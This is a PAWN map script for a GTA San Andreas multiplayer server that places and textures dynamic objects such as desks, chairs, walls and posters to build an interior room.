tmpobjid = CreateDynamicObject(18766,826.199,-973.758,1088.602,90.000,0.000,180.000,-1,-1,-1,300.000,300.000);
SetDynamicObjectMaterial(tmpobjid, 0, 14714, "vghss1int2", "HS1_2Floor1", 0);
tmpobjid = CreateDynamicObject(18766,818.719,-981.400,1088.602,90.000,0.000,90.000,-1,-1,-1,300.000,300.000);
SetDynamicObjectMaterial(tmpobjid, 0, 14714, "vghss1int2", "HS1_2Floor1", 0);
tmpobjid = CreateDynamicObject(18766,818.719,-971.409,1088.602,90.000,0.000,90.000,-1,-1,-1,300.000,300.000);
SetDynamicObjectMaterial(tmpobjid, 0, 14714, "vghss1int2", "HS1_2Floor1", 0);
tmpobjid = CreateDynamicObject(18766,818.719,-961.425,1088.602,90.000,0.000,90.000,-1,-1,-1,300.000,300.000);
SetDynamicObjectMaterial(tmpobjid, 0, 14714, "vghss1int2", "HS1_2Floor1", 0);
tmpobjid = CreateDynamicObject(13646,826.614,-966.622,1088.502,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
SetDynamicObjectMaterial(tmpobjid, 0, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0);
SetDynamicObjectMaterial(tmpobjid, 1, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0);
tmpobjid = CreateDynamicObject(13646,846.691,-966.622,1088.502,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
SetDynamicObjectMaterial(tmpobjid, 0, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0);
SetDynamicObjectMaterial(tmpobjid, 1, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0);
tmpobjid = CreateDynamicObject(13646,836.258,-966.622,1088.502,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
SetDynamicObjectMaterial(tmpobjid, 0, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0);
SetDynamicObjectMaterial(tmpobjid, 1, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0);
tmpobjid = CreateDynamicObject(13646,836.258,-980.981,1088.502,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
SetDynamicObjectMaterial(tmpobjid, 0, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0);
SetDynamicObjectMaterial(tmpobjid, 1, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0);
tmpobjid = CreateDynamicObject(13646,826.614,-980.981,1088.502,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
SetDynamicObjectMaterial(tmpobjid, 0, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0);
SetDynamicObjectMaterial(tmpobjid, 1, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0);
tmpobjid = CreateDynamicObject(13646,846.691,-980.981,1088.502,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
SetDynamicObjectMaterial(tmpobjid, 0, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0);
SetDynamicObjectMaterial(tmpobjid, 1, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0);
tmpobjid = CreateDynamicObject(13646,813.918,-980.981,1088.502,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
SetDynamicObjectMaterial(tmpobjid, 0, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0);
SetDynamicObjectMaterial(tmpobjid, 1, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0);
tmpobjid = CreateDynamicObject(13646,813.918,-966.622,1088.502,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
SetDynamicObjectMaterial(tmpobjid, 0, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0);
SetDynamicObjectMaterial(tmpobjid, 1, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0);
tmpobjid = CreateDynamicObject(3533,841.536,-966.666,1093.212,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
SetDynamicObjectMaterial(tmpobjid, 0, 16322, "a51_stores", "steel64", 0);
SetDynamicObjectMaterial(tmpobjid, 1, 2589, "ab_ab", "ab_sheetSteel", 0);
tmpobjid = CreateDynamicObject(3533,831.278,-966.329,1093.212,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
SetDynamicObjectMaterial(tmpobjid, 0, 16322, "a51_stores", "steel64", 0);
SetDynamicObjectMaterial(tmpobjid, 1, 2589, "ab_ab", "ab_sheetSteel", 0);
tmpobjid = CreateDynamicObject(3533,831.278,-980.787,1093.212,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
SetDynamicObjectMaterial(tmpobjid, 0, 16322, "a51_stores", "steel64", 0);
SetDynamicObjectMaterial(tmpobjid, 1, 2589, "ab_ab", "ab_sheetSteel", 0);
tmpobjid = CreateDynamicObject(3533,841.536,-980.787,1093.212,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
SetDynamicObjectMaterial(tmpobjid, 0, 16322, "a51_stores", "steel64", 0);
SetDynamicObjectMaterial(tmpobjid, 1, 2589, "ab_ab", "ab_sheetSteel", 0);
tmpobjid = CreateDynamicObject(3533,808.096,-973.801,1093.212,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
SetDynamicObjectMaterial(tmpobjid, 0, 16322, "a51_stores", "steel64", 0);
SetDynamicObjectMaterial(tmpobjid, 1, 2589, "ab_ab", "ab_sheetSteel", 0);
tmpobjid = CreateDynamicObject(3533,808.096,-980.787,1093.212,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
SetDynamicObjectMaterial(tmpobjid, 0, 16322, "a51_stores", "steel64", 0);
SetDynamicObjectMaterial(tmpobjid, 1, 2589, "ab_ab", "ab_sheetSteel", 0);
tmpobjid = CreateDynamicObject(3533,808.096,-966.329,1093.212,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
SetDynamicObjectMaterial(tmpobjid, 0, 16322, "a51_stores", "steel64", 0);
SetDynamicObjectMaterial(tmpobjid, 1, 2589, "ab_ab", "ab_sheetSteel", 0);
tmpobjid = CreateDynamicObject(2184,813.889,-977.406,1089.073,0.000,0.000,45.491,-1,-1,-1,300.000,300.000);
SetDynamicObjectMaterial(tmpobjid, 0, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0);
SetDynamicObjectMaterial(tmpobjid, 1, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0);
tmpobjid = CreateDynamicObject(2184,815.687,-975.168,1089.073,0.000,0.000,88.081,-1,-1,-1,300.000,300.000);
SetDynamicObjectMaterial(tmpobjid, 0, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0);
SetDynamicObjectMaterial(tmpobjid, 1, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0);
tmpobjid = CreateDynamicObject(2184,815.467,-972.259,1089.073,0.000,0.000,130.908,-1,-1,-1,300.000,300.000);
SetDynamicObjectMaterial(tmpobjid, 0, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0);
SetDynamicObjectMaterial(tmpobjid, 1, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0);
tmpobjid = CreateDynamicObject(18981,806.375,-973.909,1085.597,0.000,180.000,0.000,-1,-1,-1,300.000,300.000);
SetDynamicObjectMaterial(tmpobjid, 0, 4828, "airport3_las", "alax1_las", 0);
tmpobjid = CreateDynamicObject(1806,813.252,-975.450,1089.064,0.000,0.000,229.000,-1,-1,-1,300.000,300.000);
SetDynamicObjectMaterial(tmpobjid, 0, 9515, "bigboxtemp1", "carlot1_sfw", 0);
SetDynamicObjectMaterial(tmpobjid, 1, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0);
tmpobjid = CreateDynamicObject(2172,807.384,-970.209,1089.082,0.000,0.000,88.310,-1,-1,-1,300.000,300.000);
SetDynamicObjectMaterial(tmpobjid, 0, 10765, "airportgnd_sfse", "white", 0);
SetDynamicObjectMaterial(tmpobjid, 1, 10765, "airportgnd_sfse", "white", 0);
SetDynamicObjectMaterial(tmpobjid, 3, 10765, "airportgnd_sfse", "white", 0);
SetDynamicObjectMaterial(tmpobjid, 4, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0);
SetDynamicObjectMaterial(tmpobjid, 5, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0);
SetDynamicObjectMaterial(tmpobjid, 6, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0);
tmpobjid = CreateDynamicObject(2184,821.129,-981.631,1089.129,0.000,0.000,176.622,-1,-1,-1,300.000,300.000);
SetDynamicObjectMaterial(tmpobjid, 0, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0);
SetDynamicObjectMaterial(tmpobjid, 1, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0);
tmpobjid = CreateDynamicObject(2184,819.567,-966.609,1089.149,0.000,0.000,360.000,-1,-1,-1,300.000,300.000);
SetDynamicObjectMaterial(tmpobjid, 0, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0);
SetDynamicObjectMaterial(tmpobjid, 1, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0);
tmpobjid = CreateDynamicObject(2193,807.339,-962.867,1089.064,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
SetDynamicObjectMaterial(tmpobjid, 0, 10765, "airportgnd_sfse", "white", 0);
SetDynamicObjectMaterial(tmpobjid, 3, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0);
SetDynamicObjectMaterial(tmpobjid, 4, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0);
SetDynamicObjectMaterial(tmpobjid, 5, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0);
tmpobjid = CreateDynamicObject(2198,807.316,-977.883,1088.996,0.000,0.000,90.000,-1,-1,-1,300.000,300.000);
SetDynamicObjectMaterial(tmpobjid, 4, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0);
tmpobjid = CreateDynamicObject(2208,807.436,-985.899,1089.097,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
SetDynamicObjectMaterial(tmpobjid, 0, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0);
tmpobjid = CreateDynamicObject(2309,819.464,-967.849,1089.026,0.000,0.000,341.000,-1,-1,-1,300.000,300.000);
SetDynamicObjectMaterial(tmpobjid, 0, 9515, "bigboxtemp1", "carlot1_sfw", 0);
tmpobjid = CreateDynamicObject(2308,816.522,-962.914,1089.086,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
SetDynamicObjectMaterial(tmpobjid, 1, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0);
SetDynamicObjectMaterial(tmpobjid, 2, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0);
SetDynamicObjectMaterial(tmpobjid, 3, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0);
tmpobjid = CreateDynamicObject(2186,818.761,-985.871,1089.086,0.000,0.000,180.000,-1,-1,-1,300.000,300.000);
SetDynamicObjectMaterial(tmpobjid, 0, 10765, "airportgnd_sfse", "white", 0);
tmpobjid = CreateDynamicObject(2190,815.518,-972.569,1089.826,0.000,0.000,265.338,-1,-1,-1,300.000,300.000);
SetDynamicObjectMaterial(tmpobjid, 0, 10765, "airportgnd_sfse", "white", 0);
tmpobjid = CreateDynamicObject(18981,813.693,-960.921,1085.597,0.000,180.000,90.000,-1,-1,-1,300.000,300.000);
SetDynamicObjectMaterial(tmpobjid, 0, 4828, "airport3_las", "alax1_las", 0);
tmpobjid = CreateDynamicObject(18981,838.683,-960.940,1085.597,0.000,180.000,90.000,-1,-1,-1,300.000,300.000);
SetDynamicObjectMaterial(tmpobjid, 0, 4828, "airport3_las", "alax1_las", 0);
SetDynamicObjectMaterial(tmpobjid, 1, 14530, "estate2", "Auto_Slamvan2", 0);
tmpobjid = CreateDynamicObject(18981,813.693,-986.866,1085.597,0.000,180.000,90.000,-1,-1,-1,300.000,300.000);
SetDynamicObjectMaterial(tmpobjid, 0, 4828, "airport3_las", "alax1_las", 0);
tmpobjid = CreateDynamicObject(18981,838.666,-986.860,1085.597,0.000,180.000,90.000,-1,-1,-1,300.000,300.000);
SetDynamicObjectMaterial(tmpobjid, 0, 4828, "airport3_las", "alax1_las", 0);
tmpobjid = CreateDynamicObject(18981,851.645,-973.905,1085.597,0.000,180.000,0.000,-1,-1,-1,300.000,300.000);
SetDynamicObjectMaterial(tmpobjid, 0, 4828, "airport3_las", "alax1_las", 0);
tmpobjid = CreateDynamicObject(2190,815.549,-975.246,1089.826,0.000,0.000,232.907,-1,-1,-1,300.000,300.000);
SetDynamicObjectMaterial(tmpobjid, 0, 10765, "airportgnd_sfse", "white", 0);
tmpobjid = CreateDynamicObject(2190,814.239,-977.025,1089.826,0.000,0.000,193.178,-1,-1,-1,300.000,300.000);
SetDynamicObjectMaterial(tmpobjid, 0, 10765, "airportgnd_sfse", "white", 0);
tmpobjid = CreateDynamicObject(2201,815.723,-972.888,1089.823,0.000,0.000,13.786,-1,-1,-1,300.000,300.000);
SetDynamicObjectMaterial(tmpobjid, 0, 10765, "airportgnd_sfse", "white", 0);
tmpobjid = CreateDynamicObject(1806,813.807,-974.164,1089.064,0.000,0.000,261.748,-1,-1,-1,300.000,300.000);
SetDynamicObjectMaterial(tmpobjid, 0, 9515, "bigboxtemp1", "carlot1_sfw", 0);
tmpobjid = CreateDynamicObject(1806,813.629,-972.699,1089.064,0.000,0.000,293.239,-1,-1,-1,300.000,300.000);
SetDynamicObjectMaterial(tmpobjid, 0, 9515, "bigboxtemp1", "carlot1_sfw", 0);
tmpobjid = CreateDynamicObject(1806,808.405,-963.011,1089.064,0.000,0.000,7.393,-1,-1,-1,300.000,300.000);
SetDynamicObjectMaterial(tmpobjid, 0, 9515, "bigboxtemp1", "carlot1_sfw", 0);
tmpobjid = CreateDynamicObject(1806,808.456,-969.634,1089.064,0.000,0.000,92.785,-1,-1,-1,300.000,300.000);
SetDynamicObjectMaterial(tmpobjid, 0, 9515, "bigboxtemp1", "carlot1_sfw", 0);
tmpobjid = CreateDynamicObject(1806,808.418,-977.080,1089.064,0.000,0.000,92.785,-1,-1,-1,300.000,300.000);
SetDynamicObjectMaterial(tmpobjid, 0, 9515, "bigboxtemp1", "carlot1_sfw", 0);
tmpobjid = CreateDynamicObject(2186,819.438,-961.964,1089.086,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
SetDynamicObjectMaterial(tmpobjid, 0, 10765, "airportgnd_sfse", "white", 0);
tmpobjid = CreateDynamicObject(2190,821.322,-966.705,1089.826,0.000,0.000,193.178,-1,-1,-1,300.000,300.000);
SetDynamicObjectMaterial(tmpobjid, 0, 10765, "airportgnd_sfse", "white", 0);
tmpobjid = CreateDynamicObject(1806,817.570,-962.801,1089.064,0.000,0.000,92.785,-1,-1,-1,300.000,300.000);
SetDynamicObjectMaterial(tmpobjid, 0, 9515, "bigboxtemp1", "carlot1_sfw", 0);
tmpobjid = CreateDynamicObject(1806,820.008,-983.314,1089.064,0.000,0.000,351.343,-1,-1,-1,300.000,300.000);
SetDynamicObjectMaterial(tmpobjid, 0, 9515, "bigboxtemp1", "carlot1_sfw", 0);
tmpobjid = CreateDynamicObject(1806,820.588,-964.987,1089.064,0.000,0.000,178.314,-1,-1,-1,300.000,300.000);
SetDynamicObjectMaterial(tmpobjid, 0, 9515, "bigboxtemp1", "carlot1_sfw", 0);
tmpobjid = CreateDynamicObject(2309,820.711,-968.054,1089.026,0.000,0.000,10.873,-1,-1,-1,300.000,300.000);
SetDynamicObjectMaterial(tmpobjid, 0, 9515, "bigboxtemp1", "carlot1_sfw", 0);
tmpobjid = CreateDynamicObject(2309,819.644,-979.976,1089.026,0.000,0.000,193.000,-1,-1,-1,300.000,300.000);
SetDynamicObjectMaterial(tmpobjid, 0, 9515, "bigboxtemp1", "carlot1_sfw", 0);
tmpobjid = CreateDynamicObject(2309,818.688,-980.275,1089.026,0.000,0.000,208.480,-1,-1,-1,300.000,300.000);
SetDynamicObjectMaterial(tmpobjid, 0, 9515, "bigboxtemp1", "carlot1_sfw", 0);
tmpobjid = CreateDynamicObject(2257,806.884,-969.905,1093.492,0.000,0.000,90.000,-1,-1,-1,300.000,300.000);
SetDynamicObjectMaterial(tmpobjid, 1, 2464, "rc_shop_acc", "CJ_RC_4", 0);
tmpobjid = CreateDynamicObject(2257,806.882,-977.489,1093.492,0.000,0.000,90.000,-1,-1,-1,300.000,300.000);
SetDynamicObjectMaterial(tmpobjid, 1, 2464, "rc_shop_acc", "CJ_RC_2", 0);
tmpobjid = CreateDynamicObject(2257,826.422,-961.454,1093.492,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
SetDynamicObjectMaterial(tmpobjid, 1, 2464, "rc_shop_acc", "CJ_RC_3", 0);
tmpobjid = CreateDynamicObject(2257,836.918,-961.451,1093.492,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
SetDynamicObjectMaterial(tmpobjid, 1, 14530, "estate2", "Auto_windsor", 0);
tmpobjid = CreateDynamicObject(2257,846.532,-961.459,1093.492,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
SetDynamicObjectMaterial(tmpobjid, 1, 14530, "estate2", "Auto_Slamvan2", 0);
tmpobjid = CreateDynamicObject(2257,846.610,-986.346,1093.492,0.000,0.000,180.000,-1,-1,-1,300.000,300.000);
SetDynamicObjectMaterial(tmpobjid, 0, 14530, "estate2", "Auto_feltzer", 0);
SetDynamicObjectMaterial(tmpobjid, 1, 14530, "estate2", "Auto_feltzer", 0);
tmpobjid = CreateDynamicObject(2257,836.405,-986.346,1093.512,0.000,0.000,180.000,-1,-1,-1,300.000,300.000);
SetDynamicObjectMaterial(tmpobjid, 1, 14530, "estate2", "Auto_hustler", 0);
tmpobjid = CreateDynamicObject(2257,825.853,-986.340,1093.512,0.000,0.000,180.000,-1,-1,-1,300.000,300.000);
SetDynamicObjectMaterial(tmpobjid, 1, 2464, "rc_shop_acc", "CJ_RC_1", 0);
tmpobjid = CreateDynamicObject(18981,813.633,-973.890,1098.527,0.000,90.000,0.000,-1,-1,-1,300.000,300.000);
SetDynamicObjectMaterial(tmpobjid, 0, 6332, "rodeo01_law2", "rodwall04_LAw2", 0);
tmpobjid = CreateDynamicObject(18981,838.619,-973.892,1098.527,0.000,90.000,0.000,-1,-1,-1,300.000,300.000);
SetDynamicObjectMaterial(tmpobjid, 0, 6332, "rodeo01_law2", "rodwall04_LAw2", 0);
/////////////////////////////////////////////////////////////////////////////////////////////////////////////////
/////////////////////////////////////////////////////////////////////////////////////////////////////////////////
/////////////////////////////////////////////////////////////////////////////////////////////////////////////////
tmpobjid = CreateDynamicObject(2200,812.867,-961.535,1089.079,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
tmpobjid = CreateDynamicObject(19176,851.062,-973.659,1090.544,0.000,0.000,270.000,-1,-1,-1,300.000,300.000);
tmpobjid = CreateDynamicObject(19176,813.910,-986.288,1090.521,0.000,0.000,180.000,-1,-1,-1,300.000,300.000);
tmpobjid = CreateDynamicObject(1808,820.082,-986.160,1089.044,0.000,0.000,180.000,-1,-1,-1,300.000,300.000);
tmpobjid = CreateDynamicObject(367,809.417,-986.055,1089.954,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
tmpobjid = CreateDynamicObject(2894,808.589,-985.908,1089.961,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
tmpobjid = CreateDynamicObject(1738,809.820,-961.474,1089.683,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
tmpobjid = CreateDynamicObject(2816,807.629,-985.915,1089.958,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
tmpobjid = CreateDynamicObject(19808,814.799,-972.474,1089.847,0.000,0.000,291.882,-1,-1,-1,300.000,300.000);
tmpobjid = CreateDynamicObject(19808,814.950,-974.689,1089.847,0.000,0.000,243.576,-1,-1,-1,300.000,300.000);
tmpobjid = CreateDynamicObject(19808,814.187,-976.221,1089.847,0.000,0.000,212.950,-1,-1,-1,300.000,300.000);
tmpobjid = CreateDynamicObject(14705,815.198,-975.755,1090.077,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
tmpobjid = CreateDynamicObject(14705,814.750,-971.420,1090.077,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
tmpobjid = CreateDynamicObject(325,814.711,-971.452,1090.233,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
tmpobjid = CreateDynamicObject(325,815.132,-975.771,1090.233,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
tmpobjid = CreateDynamicObject(2201,814.105,-977.337,1089.823,0.000,0.000,307.285,-1,-1,-1,300.000,300.000);
tmpobjid = CreateDynamicObject(2201,814.142,-970.683,1089.823,0.000,0.000,57.406,-1,-1,-1,300.000,300.000);
tmpobjid = CreateDynamicObject(2200,806.978,-984.123,1089.079,0.000,0.000,90.000,-1,-1,-1,300.000,300.000);
tmpobjid = CreateDynamicObject(2200,822.761,-986.281,1089.079,0.000,0.000,180.000,-1,-1,-1,300.000,300.000);
tmpobjid = CreateDynamicObject(2190,821.075,-981.943,1089.826,0.000,0.000,301.225,-1,-1,-1,300.000,300.000);
tmpobjid = CreateDynamicObject(19808,821.145,-965.921,1089.927,0.000,0.000,212.495,-1,-1,-1,300.000,300.000);
tmpobjid = CreateDynamicObject(2816,819.434,-981.758,1089.898,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
tmpobjid = CreateDynamicObject(19808,820.419,-982.354,1089.907,0.000,0.000,332.008,-1,-1,-1,300.000,300.000);
tmpobjid = CreateDynamicObject(2813,820.140,-966.140,1089.900,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
tmpobjid = CreateDynamicObject(1808,811.014,-961.529,1089.044,0.000,0.000,360.000,-1,-1,-1,300.000,300.000);
tmpobjid = CreateDynamicObject(14834,807.268,-971.913,1089.357,0.000,0.000,351.199,-1,-1,-1,300.000,300.000);
tmpobjid = CreateDynamicObject(2813,816.454,-962.708,1089.900,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
tmpobjid = CreateDynamicObject(1738,806.934,-967.952,1089.683,0.000,0.000,90.000,-1,-1,-1,300.000,300.000);
tmpobjid = CreateDynamicObject(1738,807.059,-979.329,1089.683,0.000,0.000,90.000,-1,-1,-1,300.000,300.000);
tmpobjid = CreateDynamicObject(1738,811.411,-986.225,1089.683,0.000,0.000,180.000,-1,-1,-1,300.000,300.000);
tmpobjid = CreateDynamicObject(1738,824.666,-986.225,1089.683,0.000,0.000,180.000,-1,-1,-1,300.000,300.000);
tmpobjid = CreateDynamicObject(1738,825.831,-986.225,1089.683,0.000,0.000,180.000,-1,-1,-1,300.000,300.000);
tmpobjid = CreateDynamicObject(1738,835.206,-986.225,1089.683,0.000,0.000,180.000,-1,-1,-1,300.000,300.000);
tmpobjid = CreateDynamicObject(1738,836.298,-986.225,1089.683,0.000,0.000,180.000,-1,-1,-1,300.000,300.000);
tmpobjid = CreateDynamicObject(1738,844.247,-986.225,1089.683,0.000,0.000,180.000,-1,-1,-1,300.000,300.000);
tmpobjid = CreateDynamicObject(1738,845.394,-986.225,1089.683,0.000,0.000,180.000,-1,-1,-1,300.000,300.000);
tmpobjid = CreateDynamicObject(1738,851.090,-981.544,1089.683,0.000,0.000,270.000,-1,-1,-1,300.000,300.000);
tmpobjid = CreateDynamicObject(1738,851.090,-980.491,1089.683,0.000,0.000,270.000,-1,-1,-1,300.000,300.000);
tmpobjid = CreateDynamicObject(1738,851.090,-968.784,1089.683,0.000,0.000,270.000,-1,-1,-1,300.000,300.000);
tmpobjid = CreateDynamicObject(1738,851.090,-967.781,1089.683,0.000,0.000,270.000,-1,-1,-1,300.000,300.000);
tmpobjid = CreateDynamicObject(1738,845.972,-961.475,1089.683,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
tmpobjid = CreateDynamicObject(1738,844.815,-961.474,1089.683,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
tmpobjid = CreateDynamicObject(1738,836.218,-961.471,1089.683,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
tmpobjid = CreateDynamicObject(1738,835.209,-961.474,1089.683,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
tmpobjid = CreateDynamicObject(1738,826.332,-961.474,1089.683,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
tmpobjid = CreateDynamicObject(1738,827.401,-961.474,1089.683,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
tmpobjid = CreateDynamicObject(1706,838.107,-961.901,1089.065,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
tmpobjid = CreateDynamicObject(1706,841.204,-961.901,1089.065,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
tmpobjid = CreateDynamicObject(1706,829.450,-961.901,1089.065,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
tmpobjid = CreateDynamicObject(1706,832.263,-961.901,1089.065,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
tmpobjid = CreateDynamicObject(1706,841.906,-985.915,1089.065,0.000,0.000,180.000,-1,-1,-1,300.000,300.000);
tmpobjid = CreateDynamicObject(1706,839.003,-985.915,1089.065,0.000,0.000,180.000,-1,-1,-1,300.000,300.000);
tmpobjid = CreateDynamicObject(1706,833.401,-985.915,1089.065,0.000,0.000,180.000,-1,-1,-1,300.000,300.000);
tmpobjid = CreateDynamicObject(1706,830.173,-985.915,1089.065,0.000,0.000,180.000,-1,-1,-1,300.000,300.000);
tmpobjid = CreateDynamicObject(1721,849.702,-986.086,1089.099,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
tmpobjid = CreateDynamicObject(1721,849.006,-986.086,1089.099,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
tmpobjid = CreateDynamicObject(1721,848.263,-986.086,1089.099,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
tmpobjid = CreateDynamicObject(1721,849.290,-961.542,1089.099,0.000,0.000,180.000,-1,-1,-1,300.000,300.000);
tmpobjid = CreateDynamicObject(1721,848.476,-961.542,1089.099,0.000,0.000,180.000,-1,-1,-1,300.000,300.000);
tmpobjid = CreateDynamicObject(1721,847.681,-961.542,1089.099,0.000,0.000,180.000,-1,-1,-1,300.000,300.000);
tmpobjid = CreateDynamicObject(1808,850.939,-984.032,1089.044,0.000,0.000,270.000,-1,-1,-1,300.000,300.000);
tmpobjid = CreateDynamicObject(1808,850.960,-965.119,1089.044,0.000,0.000,270.000,-1,-1,-1,300.000,300.000);
tmpobjid = CreateDynamicObject(2001,850.878,-977.276,1089.065,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
tmpobjid = CreateDynamicObject(2001,850.882,-978.131,1089.065,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
tmpobjid = CreateDynamicObject(2001,850.833,-970.130,1089.065,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
tmpobjid = CreateDynamicObject(2001,850.840,-970.863,1089.065,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
tmpobjid = CreateDynamicObject(2001,850.759,-962.560,1089.065,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
tmpobjid = CreateDynamicObject(2001,840.187,-961.917,1089.065,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
tmpobjid = CreateDynamicObject(2001,831.418,-961.948,1089.065,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
tmpobjid = CreateDynamicObject(2001,822.474,-961.694,1089.065,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
tmpobjid = CreateDynamicObject(2001,823.130,-961.705,1089.065,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
tmpobjid = CreateDynamicObject(2001,815.334,-961.710,1089.065,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
tmpobjid = CreateDynamicObject(2001,807.186,-964.366,1089.065,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
tmpobjid = CreateDynamicObject(2001,807.503,-975.675,1089.065,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
tmpobjid = CreateDynamicObject(2001,816.671,-985.781,1089.065,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
tmpobjid = CreateDynamicObject(2001,827.666,-986.188,1089.065,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
tmpobjid = CreateDynamicObject(2001,831.404,-986.008,1089.065,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
tmpobjid = CreateDynamicObject(2001,839.914,-985.766,1089.065,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
tmpobjid = CreateDynamicObject(2001,850.780,-985.725,1089.065,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
tmpobjid = CreateDynamicObject(2163,824.140,-961.418,1089.063,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
tmpobjid = CreateDynamicObject(2258,809.435,-986.346,1092.645,0.000,0.000,180.000,-1,-1,-1,300.000,300.000);
tmpobjid = CreateDynamicObject(2261,811.111,-961.931,1093.127,0.000,0.000,1.000,-1,-1,-1,300.000,300.000);
tmpobjid = CreateDynamicObject(2262,817.090,-961.898,1093.163,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
tmpobjid = CreateDynamicObject(2273,850.664,-967.398,1092.575,0.000,0.000,-90.000,-1,-1,-1,300.000,300.000);
tmpobjid = CreateDynamicObject(2272,850.636,-982.161,1092.570,0.000,0.000,-90.000,-1,-1,-1,300.000,300.000);
tmpobjid = CreateDynamicObject(14699,847.845,-973.201,1096.653,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
tmpobjid = CreateDynamicObject(14699,847.845,-977.411,1096.653,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
tmpobjid = CreateDynamicObject(14699,839.940,-977.411,1096.653,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
tmpobjid = CreateDynamicObject(14699,839.940,-973.201,1096.653,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
